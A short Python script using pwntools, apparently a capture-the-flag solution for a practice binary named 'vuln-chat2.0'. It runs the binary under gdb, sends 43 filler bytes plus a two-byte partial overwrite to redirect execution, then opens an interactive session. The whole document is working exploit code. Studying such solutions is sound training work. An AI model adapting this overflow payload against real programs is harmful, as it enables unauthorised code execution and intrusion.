from pwn import *

target = gdb.debug("./vuln-chat2.0", "b * (doThings )")

payload = b"A" * 43 
payload += b"\x72\x86"

target.sendline(b"hi")
print(target.recvuntil(b"hi:"))

target.sendline(payload)

target.interactive()